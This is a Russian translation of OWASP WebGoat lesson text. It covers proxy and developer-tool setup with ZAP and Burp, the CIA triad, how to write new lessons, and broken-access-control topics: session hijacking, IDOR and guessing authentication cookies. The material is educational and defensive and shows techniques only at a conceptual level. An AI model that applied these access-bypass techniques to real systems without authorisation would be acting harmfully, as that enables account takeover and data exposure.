### **WebGoat** ###
#### **Что такое WebGoat?**

**WebGoat** — это намеренно небезопасное приложение, которое позволяет разработчикам, таким как вы, тестировать уязвимости, часто встречающиеся в приложениях на основе Java, использующих популярные компоненты с открытым исходным кодом.

Хотя мы никоим образом не одобряем причинение вреда каким-либо животным, особенно козам, мы считаем, что изучение всего, что связано с уязвимостями безопасности, необходимо для понимания того, что происходит, когда даже небольшой фрагмент непреднамеренного кода попадает в ваши приложения.

Какой способ может быть лучше для этого, чем использовать свой собственный "козёл отпущения"?

Не стесняйтесь делать с ним всё, что захотите. Взламывайте, тыкайте, исследуйте, и, если вам станет легче, пугайте его от всей души. Вперёд, взломайте козла! Мы обещаем, ему это нравится.

---

### **WebWolf** ###
#### **Знакомство с WebWolf** 

**WebWolf** вам понадобится только в том случае, если в задании указано, что его можно использовать. Для многих уроков в WebGoat вы можете обойтись без WebWolf. Задания, в которых можно использовать WebWolf, помечены специальным значком (в правом верхнем углу задания).

==**Важно:**== Даже если значок присутствует, вы **не обязаны** использовать WebWolf. Вы можете использовать любой перехватывающий инструмент, который вам нравится (например, netcat и другие).

#### **Что такое WebWolf?**

WebWolf открывается в новой вкладке браузера и представляет собой отдельное веб-приложение, которое имитирует машину злоумышленника. Это позволяет четко разделить действия, происходящие на атакуемом сайте (WebGoat), и те действия, которые вам нужно выполнить в роли "атакующего".

Идея создания WebWolf возникла после нескольких воркшопов, где была получена обратная связь о том, что нет четкого разграничения между ролью "атакующего" и ролью "пользователя" на сайте.

#### **Функциональность WebWolf**

WebWolf поддерживает следующую функциональность:

*   **Хостинг файлов:** Вы можете размещать файлы на своей "атакующей" машине.
*   **Прием электронной почты:** WebWolf имеет встроенный почтовый ящик для получения писем в ходе выполнения заданий.
*   **Целевая страница для входящих запросов:** Она служит точкой назначения для запросов, которые вы инициируете из WebGoat или других мест, позволяя вам видеть и анализировать эти запросы.

---

### **Общие**
#### **Основы HTTP** ####
##### **Концепция**
Этот урок представляет основы для понимания передачи данных между браузером и веб-приложением, а также того, как перехватить запрос/ответ с помощью HTTP-прокси.

**Цели**
Пользователь должен ознакомиться с функциями WebGoat, используя расположенные выше кнопки для просмотра подсказок, показа параметров HTTP-запроса, куки HTTP-запроса и исходного кода на Java. Вы можете использовать стандартные Инструменты разработчика в вашем браузере для просмотра HTTP-запроса и ответа.

**Как работает HTTP:**

Все HTTP-транзакции следуют одному и тому же общему формату. Каждый клиентский запрос и серверный ответ состоят из трех частей: строка запроса или ответа, раздел заголовков и тело сообщения.

Клиент инициирует транзакцию следующим образом:
*   Клиент обращается к серверу и отправляет запрос документа. GET-запрос может иметь параметры URL, и эти параметры будут доступны в журналах веб-доступа.
    *   `GET /index.html?param=value HTTP/1.0`

*   Далее клиент отправляет дополнительную информацию в заголовках, чтобы сообщить серверу о своей конфигурации и принимаемых форматах документов.
    *   `User-Agent: Mozilla/4.06 Accept: image/gif,image/jpeg, /`

*   В POST-запросе данные, предоставленные пользователем, следуют после дополнительных заголовков и не являются частью URL-адреса POST-запроса.

---
#### **HTTP-прокси** ####
##### **Концепция**
**Прокси** — это приложение-пересыльщик, которое соединяет ваш HTTP-клиент с серверными ресурсами. HTTP-клиентами могут быть браузеры или такие приложения, как curl, SOAP UI, Postman и т.д. Обычно эти прокси используются для маршрутизации и доступа в интернет, когда у самого клиента нет прямого подключения. Поэтому HTTP-прокси также идеально подходят для тестирования вашего приложения. Вы всегда можете использовать записи журнала прокси, чтобы увидеть, что фактически было отправлено от клиента к серверу. Таким образом, вы можете проверить заголовки запроса и ответа, а также полезную нагрузку XML, JSON или другие.

HTTP-прокси получают запросы от клиента и передают их дальше. Они также обычно записывают их. Они действуют как посредник (man-in-the-middle). Это даже хорошо работает с HTTPS или без него, при условии, что ваш клиент или браузер доверяет сертификату HTTP-прокси.

**Возможности ZAP Proxy**
С помощью ZAP вы можете записывать трафик, инспектировать трафик, изменять запросы и ответы из вашего браузера и в него, а также получать отчеты о ряде известных уязвимостей, которые ZAP обнаруживает путем проверки трафика. Пассивная и активная отчетность о проблемах безопасности обычно используется в конвейерах непрерывной поставки (Continuous Delivery), где используется ZAP без графического интерфейса. Здесь мы будем использовать ZAP интерактивно и в основном для просмотра и изменения запросов, чтобы находить уязвимости и решать задания. ZAP имеет графический пользовательский интерфейс, но теперь также имеет HUD (Heads-On-Display), который использует соединение Web Socket между браузером и прокси ZAP.

**Следующие страницы**
Вы можете пройти все страницы урока или перейти по этим ссылкам, чтобы пропустить некоторые страницы.
- Настройка OWASP ZAP и браузера
- Фильтрация запросов в ZAP
- Задание с прокси в ZAP
- Повторение запросов с ZAP
- Повторение запросов с Burp

---

##### **Настройка HTTP-прокси**
Поскольку это проект OWASP, мы будем использовать OWASP ZAP. Если вам удобно использовать другой прокси (например, Burp), вы можете пропустить это. В противном случае это покажет вам, как настроить ZAP в качестве прокси на вашем локальном хосте.

- Сначала загрузите и установите ZAP для вашей операционной системы
- Запустите ZAP
- Запустите браузер напрямую из ZAP

---

##### **Настройка браузера**
Поскольку настройка ZAP для проксирования localhost зависит от вашего браузера, мы рекомендуем следовать инструкциям по адресу:
https://www.zaproxy.org/docs/desktop/start/proxies/

После настройки прокси вы должны увидеть следующее в OWASP ZAP на панели истории.

На следующей странице мы покажем, как фильтровать эти запросы, чтобы видеть только релевантные, и настраивать перехватчик.

---

##### **Фильтрация запросов на панели истории**

В главном окне ZAP нажмите на "Фильтр".

Затем в поле "URL Inc Regex" введите:

`.*WebGoat.*`

А в поле "URL Exc Regex" введите:

`.*lesson.*mvc.`

Нажмите "Apply", чтобы закрыть окно, и теперь ZAP не будет показывать внутренние запросы WebGoat.

---

##### **Используйте функцию «Редактировать и отправить повторно» в ZAP**

Вместо перехвата запроса, в ZAP также есть возможность повторно отправить тот же запрос. Это помогает вам выполнить задание, потому что вам не нужно переключаться на ZAP, включать кнопку перехвата, возвращаться в WebGoat и снова выполнять запрос из браузера.

Давайте рассмотрим пример. Мы собираемся использовать пример с электронной почтой из вводного урока WebWolf. Этот урок сгенерирует запрос к `/WebGoat/WebWolf/mail`. В окне «История» выберите URL-адрес, который вы хотите отправить повторно, щелкните на нем правой кнопкой мыши и выберите `Open/Resend with Request Editor`. Вы также можете найти запрос на левой панели ZAP, как показано красной стрелкой на изображении ниже:

Откроется новое окно, и здесь вы можете изменить запрос, например, изменить адрес электронной почты на другой, и отправить его снова. На вкладке «Ответ» вы можете просмотреть ответ на запрос. В некоторых заданиях ответ будет показывать сообщение о решении, но иногда вы получаете код/флаг, который необходимо отправить в WebGoat для завершения задания. Всегда обращайте внимание на ответ. Если вы решили задание, отправив запрос, WebGoat автоматически отметит урок как выполненный.

---

##### **Проксирование HTTPS через ZAP**

Прокси ZAP также можно настроить для проксирования **HTTPS**-запросов. Оно будет завершать HTTPS-соединение в ZAP, а затем проксировать его к цели, используя свой хранилище ключей. Вы даже можете проксировать сайты с взаимным TLS (mTLS). В этом случае вы настраиваете OWASP ZAP с хранилищем ключей и ключом для использования в соединении.

Перейдите в Инструменты/Параметры/Клиентский сертификат (Tools/Options/Client Certificate), чтобы настроить прокси для сайта HTTPS с взаимным TLS. Перейдите в Инструменты/Параметры/Соединение (Tools/Options/Connection), если вы хотите установить таймауты или, например, принудительно использовать TLSv1.2.

**Экспорт сертификата**

В зависимости от локальной установки инструментов, ZAP может запустить браузер напрямую с некоторыми скорректированными настройками, такими как сетевые параметры и настройки сертификатов. Однако вам следует выполнить этот шаг, если вы хотите запускать браузер независимо от ZAP. Чтобы иметь возможность использовать браузер, ему необходим сертификат, который вы можете экспортировать здесь:

**Импорт корневого сертификата OWASP ZAP**

1.  Перейдите в Настройки (Preferences) Firefox (Mac, Linux) или Параметры (Options) (Windows) из меню.
2.  Найдите раздел, связанный с сертификатами (certificates).
3.  Нажмите *Просмотреть сертификаты* (*View Certificates*).
4.  Импортируйте сохраненный корневой сертификат ZAP (см. предыдущую страницу).

---

##### **Ручная настройка прокси**

Этот раздел необходим только если вы хотите использовать Burp или если запуск браузера через ZAP не работает. В обоих случаях требуется дополнительная настройка. В последних версиях Chrome и Firefox трафик с localhost по умолчанию не проксируется.

**Вариант 1: Изменить настройки браузера**
-   Для проксирования localhost (и связанных адресов) в новых версиях Firefox (>=67) необходимо установить настройку `network.proxy.allow_hijacking_localhost` (доступную через страницу `about:config`) в значение `true`.
-   Для проксирования localhost (и связанных адресов) в новых версиях Chrome (>=72) необходимо указать аргумент командной строки `--proxy-bypass-list=<-loopback>`.

**Вариант 2: Использовать www.webgoat.local**
-   Используйте имя вашего компьютера вместо `localhost`. Вы можете найти или добавить имя хоста в файл `/etc/hosts` на Linux и MacOSX и `C:\Windows\System32\drivers\etc\hosts` на Windows.

    Пример содержимого файла hosts:
    `127.0.0.1 www.webgoat.local`

    Затем в браузере используйте адрес: `http://www.webgoat.local:8080/WebGoat`.

**Настройка браузера для использования прокси**

Чтобы вручную настроить прокси в браузере, следуйте одной из приведенных ниже инструкций:

**Настройка прокси в Firefox**
1.  Перейдите в Настройки (Mac, Linux) или Параметры (Windows) Firefox из меню.
2.  Выберите *Дополнительные* слева.
3.  Выберите *Сеть* в разделе "Дополнительные".
4.  Нажмите *Настроить*.
5.  Выберите *Ручная настройка прокси-сервера*.
    a.  Введите **127.0.0.1** в качестве прокси (или `www.webgoat.local` в зависимости от выбранного выше варианта).
    b.  Введите **8090** в качестве порта, если WebGoat запущен локально и вы изменили порт ZAP на 8090 (в противном случае используйте **8080**).
    c.  Установите флажок *Использовать этот прокси-сервер для всех протоколов*.

**Настройка прокси в Chrome**
1.  Откройте настройки Chrome из меню.
2.  В поле *Поиск настроек* введите **прокси** и нажмите Enter. Должен появиться раздел "Сеть" с кнопкой *Изменить настройки прокси-сервера*.
3.  Нажмите кнопку *Изменить настройки прокси-сервера*.
4.  Выберите вкладку *Подключения*.
5.  Нажмите кнопку *Настройка сети*.
6.  Установите флажок *Использовать прокси-сервер для локальных подключений*.
7.  Введите **127.0.0.1** (или `www.webgoat.local` в зависимости от выбранного варианта) в поле *Адрес* и номер вашего порта (**8090**, если WebGoat запущен локально, в противном случае **8080**) в поле *Порт*.
8.  Возможно, стоит очистить поле *Не использовать прокси-сервер для адресов*, но это не обязательно.

---

##### **Прокси Burp**

Другим прокси, которое вы можете использовать, является Burp. Одно из упражнений в WebGoat можно решить только с помощью Burp, но пока еще нельзя с OWASP ZAP. Burp можно настроить только вручную. Сначала, пожалуйста, выполните шаги, описанные здесь. Вы можете скачать Community Edition Burp в виде обычного JAR-файла:

`java -jar burpsuite_community_v2.1.04.jar`

Выберите *Temporary project*, затем *Use Burp defaults*.

Перейдите в настройки прокси и измените его, чтобы использовать порт **8090**.

На этой странице вы также можете экспортировать сертификат Burp и импортировать его в свой браузер, аналогично инструкциям на предыдущих страницах.

Перейдите на вкладку перехвата прокси и нажмите на переключатель, чтобы режим перехвата был **выключен** (по умолчанию и на картинке ниже он включен).

Затем запустите браузер, подключенный к прокси, и начните использовать WebGoat. Теперь настройте правило перехвата запросов, расширив правило для того, что НЕ перехватывать:

Используйте, например:
`(.*mvc$|.*txt$|.*woff$|.*lesson$|.*gif$|.*jpg$|.*png$|.*css$|.*js$|.*ico$)`

Затем включите перехват, нажав на упомянутый ранее переключатель.

Перехваченный запрос будет выглядеть следующим образом:

Наконец, вы можете просмотреть историю, добавить фильтры для нее и повторно отправить запросы с этого экрана.

---
#### **Инструменты разработчика** ####
##### **Инструменты разработчика Google Chrome**

Для выполнения некоторых заданий вам иногда может потребоваться просмотреть исходный код JavaScript или выполнить команду JavaScript самостоятельно. Для этого в Google Chrome есть набор инструментов, который позволяет делать это и многое другое. Хотя эти инструменты не являются эксклюзивными для Google Chrome, почти каждый современный браузер имеет свой собственный набор. Наше введение будет сосредоточено на инструментах, найденных в Google Chrome. Вы, однако, все равно можете использовать браузер по своему выбору, например Firefox или Safari, хотя некоторые шаги этого руководства могут отличаться для вас.

Имейте в виду, что это руководство не предназначено для того, чтобы научить всему об этих инструментах. Оно будет сосредоточено только на основных знаниях, необходимых для выполнения конкретных заданий. Также, если вы уже знакомы с этими инструментами, вы можете смело пропустить эти уроки.

**Чтобы начать: откройте инструменты разработчика.** Есть несколько способов открыть их:

1.  Щелкните правой кнопкой мыши в любом месте окна браузера и выберите опцию «Просмотреть код» (Inspect).
2.  Перейдите в меню браузера (три точки в правом верхнем углу), затем перейдите в «Дополнительные инструменты» и выберите опцию «Инструменты разработчика».
3.  Используйте сочетание клавиш *Ctrl + Shift + I*.

---

##### **Вкладка Elements (Элементы)**

Вкладка Elements позволяет просматривать HTML и CSS код, используемый для определения и стилизации веб-сайта.

**Исходный код HTML**
Если вы наведете курсор на одну из строк, вы увидите, что часть веб-сайта подсвечивается синим цветом. Это означает, что именно эта строка HTML определяет данный раздел сайта. Вкладка Elements позволяет вносить изменения в каждый отдельный HTML-элемент. Например, если вы щелкните внутри тега абзаца (`<p>....</p>`), вы можете редактировать содержимое веб-сайта. После внесения изменений нажмите Enter, и Chrome обновит веб-сайт, чтобы показать ваши правки. Вы также можете изменить используемый HTML-тег, классы и идентификаторы тега и многое другое.

**Исходный код CSS**
Информацию о CSS, используемом для стилизации веб-сайта, вы можете найти под исходным кодом HTML. Как и в случае с HTML, вы также можете редактировать CSS и, таким образом, изменять стиль веб-сайта. Вы можете редактировать конкретные значения или отключать отдельные стили.

---

##### **Вкладка Console (Консоль)**

Во вкладке Console вы можете видеть всё, что мог вывести загруженный файл JavaScript. Не беспокойтесь, если вы увидите что-то красное. Хотя это ошибка, она, вероятно, уже разрешилась. Через вкладку Console вы также можете запускать свою собственную строку кода JavaScript.

Начните с очистки консоли с помощью сочетания клавиш `CTRL + L`.

Чтобы запустить свой JavaScript, щелкните внутри консоли и напишите что-нибудь вроде: `console.log("Привет, WebGoat!");` и нажмите Enter. «Привет, WebGoat!» теперь должно появиться в вашей консоли. Консоль также позволяет выполнять базовые арифметические действия. Если вы, например, введете 1+3 и нажмете Enter, в консоли должно отобразиться 4.

*Примечание:* Вы можете увидеть `undefined` в консоли. Вы можете смело игнорировать это сообщение, оно просто означает, что вызванная вами функция JavaScript ничего не возвращала, следовательно, `undefined`.

---

##### **Вкладки Sources (Источники) и Network (Сеть)**

**Вкладка Sources (Источники)**
Во вкладке Sources вы можете изучить файловую систему и просмотреть все HTML, CSS и JavaScript файлы, используемые для создания веб-сайта. Щелкните на файле, чтобы просмотреть его содержимое.

**Вкладка Network (Сеть)**
Во вкладке Network вы можете просматривать HTTP-запросы и ответы, которые выполнил веб-сайт. Просто нажмите на любой из них, если хотите получить более подробную информацию о конкретном запросе. «Временная шкала» (Timeline) над синими точками показывает, когда эти запросы и ответы были выполнены. Вы также можете увидеть запросы, выполненные в определенном промежутке времени, просто щелкнув и перетащив курсор по временной шкале. Окно ниже будет показывать только запросы и ответы, выполненные в этом временном интервале.
#### **Триада CIA** ####
##### **Триада CIA**

**Триада CIA** (конфиденциальность, целостность, доступность) — это модель безопасности информации. Три элемента триады считаются наиболее важными компонентами информационной безопасности и должны гарантироваться в любой безопасной системе.
Серьезные последствия могут возникнуть, если будет нарушен даже один из этих элементов.

Триада CIA была создана для обеспечения базового стандарта оценки и внедрения безопасности независимо от лежащей в основе системы и/или организации.

---

##### **Конфиденциальность (Confidentiality)**

**Конфиденциальность** — это «свойство, при котором информация не предоставляется и не раскрывается неуполномоченным лицам, организациям или процессам». Другими словами, конфиденциальность требует, чтобы неуполномоченные пользователи не могли получать доступ к конфиденциальным ресурсам. Конфиденциальность должна быть сбалансирована с доступностью; уполномоченные лица по-прежнему должны иметь доступ к ресурсам, на которые им предоставлены права.

Хотя конфиденциальность схожа с «приватностью», эти два понятия не являются взаимозаменяемыми. Напротив, конфиденциальность является компонентом приватности; конфиденциальность обеспечивается для защиты ресурсов от несанкционированного доступа.

**Примеры нарушений конфиденциальности:**
*   Хакер получает доступ к базе данных паролей компании.
*   Конфиденциальное электронное письмо отправлено не тому человеку.
*   Хакер читает конфиденциальную информацию, перехватывая и подслушивая передачу информации.

**Примеры методов обеспечения конфиденциальности:**
*   Шифрование данных.
*   Правильно реализованная аутентификация и контроль доступа:
    *   Безопасно хранимые пароли.
    *   Многофакторная аутентификация (MFA).
    *   Биометрическая верификация.
*   Минимизация количества мест/времени, где/когда информация появляется.
*   Физические меры безопасности, такие как надлежаще охраняемые серверные комнаты.

---

##### **Целостность (Integrity)**

**Целостность** — это «свойство точности и полноты». Другими словами, целостность означает поддержание согласованности, точности и достоверности данных на протяжении всего их жизненного цикла. Данные не должны изменяться во время передачи, а несанкционированные субъекты не должны изменять данные.

**Примеры нарушений целостности:**
*   Человеческая ошибка при вводе данных.
*   Ошибки во время передачи данных.
*   Ошибки в программном обеспечении и сбои оборудования.
*   Хакеры изменяют информацию, к которой у них не должно быть доступа.

**Примеры методов обеспечения целостности:**
*   Исправные методы аутентификации и контроля доступа.
*   Проверка целостности с помощью хеш-функций.
*   Резервное копирование и избыточность.
*   Аудит и ведение логов.

---

##### **Доступность (Availability)**

**Доступность** — это «свойство быть доступным и используемым по требованию уполномоченным лицом». Другими словами, уполномоченные лица должны иметь доступ к разрешенным ресурсам в любое время.

**Примеры нарушений доступности:**
*   Атаки типа «отказ в обслуживании» (DoS).
*   Сбои оборудования.
*   Пожар или другие стихийные бедствия.
*   Ошибки в конфигурации программного обеспечения или сети.

**Примеры методов обеспечения доступности:**
*   Системы обнаружения вторжений (IDS).
*   Контроль сетевого трафика.
*   Межсетевые экраны (Firewalls).
*   Физическая безопасность оборудования и базовой инфраструктуры:
    *   Защита от огня, воды и других стихий.
*   Обслуживание оборудования.
*   Избыточность.
#### **Написание нового урока**
##### **Написание нового урока**

Этот урок описывает шаги, необходимые для добавления нового урока в WebGoat. В общем случае есть четыре шага:

*   Написать содержание. В WebGoat мы используем формат AsciiDoc.
*   Создать класс урока.
*   Написать HTML-страницу-связку, чтобы WebGoat знал, как отображать содержание.
*   Добавить одно или несколько заданий в рамках урока.

Давайте посмотрим, как создать новый урок.

---

##### **Шаг 1: написание содержания**

Каждый урок может состоять из нескольких страниц с содержанием (текстом), объясняющим рассматриваемую уязвимость. Содержание пишется на [AsciiDoc](https://asciidoctor.org/docs/asciidoc-writers-guide/), что делает написание контента очень простым (если вы знаете Markdown, вы знаете AsciiDoc).

В интернете можно найти отличные руководства по синтаксису AsciiDoc. Ниже мы просто покажем базовый обзор. Мы опишем некоторые конструкции, часто используемые в WebGoat.

**Подзаголовок**
Сверьтесь с синтаксисом AsciiDoc, но больше знаков `=` означает заголовки меньшего уровня. Вы можете **выделять жирным** текст и другие элементы.

**Структурирование файлов**
Всё содержание должно быть размещено в этих `*.adoc` файлах. Файлы AsciiDoc находятся в каталоге `/src/main/resources/(урок)/documentation/`.

**Изображения**
На изображения можно ссылаться ниже, включая установку стиля (рекомендуется использовать `lesson-image` в качестве стиля). Корневой путь для изображений: `/src/main/resources/(урок)/images`.

**Блок кода**
Блоки кода пишутся следующим образом:
```
[source]
---
public class A {
    private String test;
}
---
```

---

##### **Больше контента, включая видео...**

Вы можете структурировать и форматировать контент как вам угодно. Вы даже можете включить видео, если хотите (но это может зависеть от поддержки браузером). Хотя, вероятно, вам стоит сделать его более соответствующим безопасности веб-приложений, чем этот пример.

Смотрите http://asciidoctor.org/docs/asciidoc-syntax-quick-reference/#videos для получения более подробной информации о синтаксисе видео.

**Еще больше контента**

Вы можете включить несколько `.adoc` файлов на одну страницу, поместив их в один и тот же `<div>`:
```html
<div class="lesson-page-wrapper">
    <div class="adoc-content" th:replace="~{doc:lesson-template-video.adoc}"></div>
    <div class="adoc-content" th:replace="~{doc:lesson-template-video-more.adoc}"></div>
</div>
```

---

##### **Шаг 2: добавление нового класса урока**

Каждый урок может содержать несколько заданий. Сначала давайте определим класс урока на Java:

```java
@Component
public class LessonTemplate extends Lesson {
    @Override
    public Category getDefaultCategory() {
        return Category.GENERAL;
    }
    @Override
    public String getTitle() {
        return "lesson-template.title";
    }
}
```

Добавьте новый урок в новый пакет под `org.owasp.webgoat.lessons`.

---

##### **Шаг 3: Написание HTML-страницы-связки**

Мы упомянули, что урок может состоять из нескольких заданий. WebGoat подхватывает их автоматически, и пользовательский интерфейс отображает панель навигации вверху каждого урока. Страница с заданием изначально будет красной и станет зеленой, когда пользователь решит задание. Чтобы это работало, нам нужно добавить:

```html
<html xmlns:th="http://www.thymeleaf.org">
<div class="lesson-page-wrapper">
    <div class="adoc-content" th:replace="~{doc:lessons/lessontemplate/documentation/lesson-template-intro.adoc}"></div>
</div>
<div class="lesson-page-wrapper">
    <div class="adoc-content" th:replace="~{doc:lessons/lessontemplate/documentation/lesson-template-content.adoc}"></div>
</div>
<div class="lesson-page-wrapper">
    <div class="adoc-content" th:replace="~{doc:lessons/lessontemplate/documentation/lesson-template-lesson-class.adoc}"></div>
</div>
</html>
```

Этот файл должен быть размещен в: `/src/main/resources/(урок)/html/`. Имя файла должно совпадать с именем Java-класса, который мы создали на шаге 2.

Приведенный выше фрагмент создаст три отдельные страницы (в панели навигации) с `.adoc` страницами, которые мы создали для этого урока.

Вот и всё, мы создали базовый урок только с содержанием. Чтобы всё заработало, вам нужно сделать урок доступным в WebGoat.

Вот и всё. Запустите WebGoat, и ваш урок появится в меню.

---

##### **База данных**

Если новому уроку необходимо хранить или использовать базу данных, вы можете добавить скрипт создания в каталог `/src/main/resources/(урок)/db/migration`. Имя файла должно соответствовать определенному соглашению: `V2019_11_10_1__new-lesson.sql`, где первая часть — это просто текущая дата. В этом файле вы можете, например, создавать таблицы и вставлять данные:

```sql
CREATE TABLE servers(
    id varchar(10),
    hostname varchar(20),
    ip varchar(20),
    mac varchar(20),
    status varchar(20),
    description varchar(40)
);

INSERT INTO servers VALUES ('1', 'webgoat-dev', '192.168.4.0', 'AA:BB:11:22:CC:DD', 'online', 'Development server');
INSERT INTO servers VALUES ('2', 'webgoat-tst', '192.168.2.1', 'EE:FF:33:44:AA:CC', 'online', 'Test server');
INSERT INTO servers VALUES ('3', 'webgoat-acc', '192.168.3.3', 'EF:12:FE:34:AA:CC', 'offline', 'Acceptance server');
INSERT INTO servers VALUES ('4', 'webgoat-pre-prod', '192.168.6.4', 'EF:12:FE:34:AA:CC', 'offline', 'Pre-production server');
INSERT INTO servers VALUES ('5', 'webgoat-prd', '104.130.219.202', 'FA:91:EB:82:DC:73', 'out of order', 'Production server');
```

Создание базы данных автоматически позволит WebGoat сбрасывать базу данных в исходное состояние.

---

### **(A1) Нарушения контроля доступа (Broken Access Control)**  
#### **Взлом сеанса**
**Концепция**

Разработчики приложений, которые создают собственные идентификаторы сессий, часто забывают о необходимости обеспечения достаточной сложности и случайности для безопасности. Если пользовательский идентификатор сессии не является сложным и случайным, то приложение сильно подвержено атакам перебора на основе сессий.

**Цели**

Получить доступ к аутентифицированной сессии, принадлежащей другому пользователю.

---
#### **Небезопасные прямые ссылки на объекты**
##### **Прямые ссылки на объекты (Direct Object References)**

**Прямые ссылки на объекты** — это когда приложение использует предоставленные клиентом входные данные для доступа к данным и объектам.

**Примеры**

Примеры прямых ссылок на объекты с использованием метода GET могут выглядеть так:
```
https://some.company.tld/dor?id=12345
https://some.company.tld/images?img=12345
https://some.company.tld/dor/12345
```

**Другие методы**

Методы POST, PUT, DELETE или другие также потенциально уязвимы и в основном отличаются только методом и потенциальной полезной нагрузкой.

**Небезопасные прямые ссылки на объекты**

Они считаются небезопасными, когда ссылка обрабатывается неправильно и позволяет обойти авторизацию или раскрыть конфиденциальные данные, которые можно использовать для выполнения операций или доступа к данным, которые пользователь не должен иметь возможности выполнять или получать. Допустим, как пользователь вы переходите к просмотру своего профиля, и URL выглядит так:
```
https://some.company.tld/app/user/23398
```
... и вы можете просмотреть свой профиль там. Что произойдет, если вы перейдете по:
```
https://some.company.tld/app/user/23399
```
... или используете другой номер в конце. Если вы можете манипулировать номером (идентификатором пользователя) и просматривать чужой профиль, то ссылка на объект небезопасна. Это, конечно, можно проверить или расширить за пределы методов GET для просмотра данных, а также для манипулирования данными.

**Дополнительные полезные материалы**

Прежде чем мы перейдем к практике, вот некоторые полезные материалы о небезопасных прямых ссылках на объекты:
*   https://www.owasp.org/index.php/Testing_for_Insecure_Direct_Object_References_(OTG-AUTHZ-004)
*   https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control
*   https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html
*   https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References
*   http://cwe.mitre.org/data/definitions/639.html

---

##### **Безопасные ссылки на объекты (Secure Object References)**

**Начните с представления конечной цели**

Есть ли у вас документированный контроль доступа? Если нет, как вы можете его обеспечить? Контроль доступа определяется бизнес-логикой, которая управляет приложением, и/или законами о конфиденциальности и другими.

**Горизонтальный и вертикальный контроль доступа**

Часто мы думаем о контроле доступа с точки зрения «ролей» (пользователь, расширенный пользователь, администратор и т.д.). Однако, как отмечалось в предыдущих упражнениях, пользователи с одной и той же «ролью» могут получать доступ к данным друг друга. Это горизонтальный контроль доступа. Оба типа контроля (горизонтальный и вертикальный) должны обеспечиваться.

| Конечная точка    | Метод | Описание (Пример матрицы контроля доступа) | Правила доступа                                      | Примечания, оговорки                                 |
|-------------------|--------|---------------------------------------------|------------------------------------------------------|-----------------------------------------------------|
| /profile          | GET    | просмотр профиля пользователя               | Вошедший в систему пользователь может просматривать только свой профиль | Администраторы должны использовать другой URI (см. ниже) |
| /profile/{id}     | GET    | просмотр профиля заданного пользователя    | Вошедший в систему пользователь может просматривать свой профиль по {id}, администраторы также могут просматривать | н/д                                                 |
| /profile/{id}     | PUT    | редактирование профиля пользователя         | Вошедший в систему пользователь может редактировать свой профиль по {id}, администраторы также могут редактировать | Редактирование администратором должно логироваться      |

**Аудит доступа**

Как показано в примере выше, ваши правила контроля доступа должны включать положения о том, какой доступ логируется. Например, если суперпользователь или администратор может редактировать профили других... это должно логироваться. Другие примеры включают обнаруженные нарушения или попытки нарушения механизмов контроля доступа.

**Использование косвенных ссылок**

Немногие приложения используют это, но вы можете применять **косвенные** ссылки. В этом случае вы можете пропускать ваши ссылки через хеширующую, кодирующую или другую функцию на сервере, чтобы идентификатор, который видит клиент, не был фактической ссылкой, обрабатываемой сервером. Это несколько снизит эффективность (распространенный компромисс ради безопасности) и все еще подвержено угадыванию, перебору или обратной разработке.

Этот подход не должен быть единственной используемой защитой. Его можно использовать в качестве дополнительного слоя. Ваш сервер должен реализовывать логику сопоставления клиентских (косвенных) ссылок с серверными (прямыми).

**Контроль доступа и API**

Часто API или RESTFul конечные точки полагаются на неясность, статический «ключ» или недостаток воображения со стороны пользователя для контроля доступа. Хорошими вариантами являются цифровые подписанные JSON Web Tokens (https://jwt.io) — хороший вариант для аутентификации API и контроля доступа, использующий комбинацию утверждений (claims) и цифровой/криптографической подписи для проверки потребителя. Другие emerging стандарты, такие как Secure Token Binding, обещают «криптографическое состояние» для веб-сервисов в заголовках запросов...
*   https://tools.ietf.org/html/draft-ietf-tokbind-protocol-10
*   https://tools.ietf.org/html/draft-ietf-tokbind-negotiation-05
*   https://tools.ietf.org/html/draft-ietf-tokbind-https-06

---

##### **Отсутствует контроль доступа на уровне функций**

**Отсутствие контроля доступа на уровне функций**

Контроль доступа, как и предотвращение XSS с помощью кодирования вывода, может быть сложным в поддержании. Необходимо убедиться, что он адекватно применяется во всем приложении, то есть в каждом методе/функции.

**IDOR в сравнении с отсутствием контроля доступа на уровне функций**

Дело в том, что многие люди (включая автора этого урока) объединяют контроль доступа на уровне функций и IDOR в понятие «Контроль доступа». Ради OWASP Top 10 и этих уроков мы проведем различие. Наиболее распространенное различие заключается в том, что IDOR — это скорее проблема «горизонтального» контроля доступа, а отсутствие контроля на уровне функций — это «раскрытие функциональности». Хотя урок по IDOR здесь демонстрирует, как функциональность также может быть раскрыта (по крайней мере, другому пользователю с той же ролью), мы рассмотрим другие способы, которыми функциональность может быть раскрыта.

---

##### **Подделка куки-файла аутентификации**

**Концепция**

Файлы cookie аутентификации используются в сервисах, требующих аутентификации. Когда пользователь входит в систему, используя личное имя пользователя и пароль, сервер проверяет предоставленные учетные данные. Если они действительны, создается сеанс.

Обычно каждому сеансу присваивается уникальный идентификатор, который идентифицирует сеанс пользователя. Когда сервер отправляет ответ пользователю, он включает заголовок «Set-Cookie», который содержит, среди прочего, имя и значение cookie.

Файл cookie аутентификации обычно хранится как на стороне клиента, так и на стороне сервера.

С одной стороны, хранение cookie на стороне клиента означает, что он может быть уязвим для кражи путем эксплуатации определенных уязвимостей или перехвата посредством атак «человек посередине» или XSS. С другой стороны, значения cookie могут быть угаданы, если известен алгоритм, используемый для его генерации.

Многие приложения автоматически входят в систему пользователя, если предоставлен правильный файл cookie аутентификации.

**Цели**

Пользователь не должен иметь возможность угадать алгоритм генерации cookie и обойти механизм аутентификации, войдя в систему под другим пользователем.

**Обоснование**

Для безопасности системы аутентификации крайне важно, чтобы алгоритм генерации cookie оставался безопасным и нелегко угадываемым. Если злоумышленник может предсказать или определить алгоритм, он может сгенерировать действительные файлы cookie аутентификации для разных пользователей, тем самым обойдя механизм аутентификации и выдавая себя за других пользователей.

Чтобы снизить этот риск, необходимо использовать надежные и криптографически безопасные алгоритмы для генерации файлов cookie аутентификации. Эти алгоритмы должны использовать строгую рандомизацию и методы хеширования, чтобы обеспечить уникальность и непредсказуемость генерируемых файлов cookie.

Кроме того, реализация таких мер, как истечение срока действия сеанса и регулярная смена файлов cookie аутентификации, может дополнительно повысить безопасность. Частая смена значений cookie и принудительные таймауты сеанса значительно сокращают возможность для злоумышленников использовать потенциальные уязвимости.

